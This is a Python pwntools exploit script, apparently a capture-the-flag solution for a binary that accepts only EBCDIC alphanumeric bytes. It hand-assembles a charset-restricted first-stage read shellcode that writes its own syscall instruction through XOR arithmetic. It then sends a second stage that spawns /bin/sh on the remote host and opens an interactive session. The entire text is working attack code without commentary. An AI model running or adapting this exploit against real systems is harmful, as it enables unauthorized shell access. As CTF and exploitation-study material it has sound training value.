#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('0xC5C2C3C4C9C3'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

def try_allow_char():
    allow = []
    with context.local(log_level='ERROR'):
        for i in range(256):
            r = process('./0xC5C2C3C4C9C3')
            r.sendafter('input:', chr(i)*128)
            if 'Not EBCDIC' not in r.recv():
                allow.append(hex(i))
            r.kill()
    print allow

allow = ['\x81', '\x82', '\x83', '\x84', '\x85', '\x86', '\x87', '\x88', '\x89', '\x91', '\x92', '\x93', '\x94', '\x95', '\x96', '\x97', '\x98', '\x99', '\xa2', '\xa3', '\xa4', '\xa5', '\xa6', '\xa7', '\xa8', '\xa9', '\xc1', '\xc2', '\xc3', '\xc4', '\xc5', '\xc6', '\xc7', '\xc8', '\xc9', '\xd1', '\xd2', '\xd3', '\xd4', '\xd5', '\xd6', '\xd7', '\xd8', '\xd9', '\xe2', '\xe3', '\xe4', '\xe5', '\xe6', '\xe7', '\xe8', '\xe9', '\xf0', '\xf1', '\xf2', '\xf3', '\xf4', '\xf5', '\xf6', '\xf7', '\xf8', '\xf9']

# make read shellcode
# eax = 3, ebx = 0, ecx = buf, edx = 0x200

sc = ''
sc += asm('sub ecx, 0xf8f8f896')
sc += asm('add ecx, 0xf8f8f897')                # ecx += 1
sc += asm('xchg eax, ecx')                      # ecx = buf, eax = 0

sc += asm('sub ecx, 0xf8f8f882')                # for [ecx + ?]

sc += asm('xor ebx, 0xf8f8f8f2')
sc += asm('xor ebx, 0xf8f8f887')                # bl = 0xcd
sc += asm('mov BYTE PTR [ecx+0xf8f8f8e2], bl')  # [buf+0x60] = bl

sc += asm('xor ebx, 0xf8f8f8a4')
sc += asm('xor ebx, 0xf8f8f8e9')                # bl = 0x80
sc += asm('mov BYTE PTR [ecx+0xf8f8f8e3], bl')  # [buf+0x61] = bl

sc += asm('mov ebx, eax')                       # ebx = 0

sc += asm('xchg eax, ebx')                      # nop
sc += asm('xchg eax, ebx')                      # nop
sc += asm('xchg eax, ebx')                      # nop
sc += asm('xchg eax, ebx')                      # nop
sc += asm('xchg eax, ebx')                      # nop

sc += asm('mov edx, eax')                       # edx = 0

sc += asm('xchg eax, ecx')
sc += asm('sub ecx, 0xf8f8f896')
sc += asm('add ecx, 0xf8f8f899')
sc += asm('xchg eax, ecx')                      # eax = 3

sc += asm('xor edx, 0xf8f8f1f8')
sc += asm('xor edx, 0xf8f8f3f8')                # edx = 0x200

sc += asm('add ecx, 0xf8f8f882')                # ecx = buf

log.info('len: {}'.format(len(sc)))
assert len(sc) <= 0x60

for c in sc:
    if c not in allow:
        print hex(ord(c))
    assert c in allow

r = remote(HOST, PORT)

r.send(sc.ljust(128, '\x81'))
r.send('\x90'*0x80 + asm(shellcraft.sh()))

r.interactive()
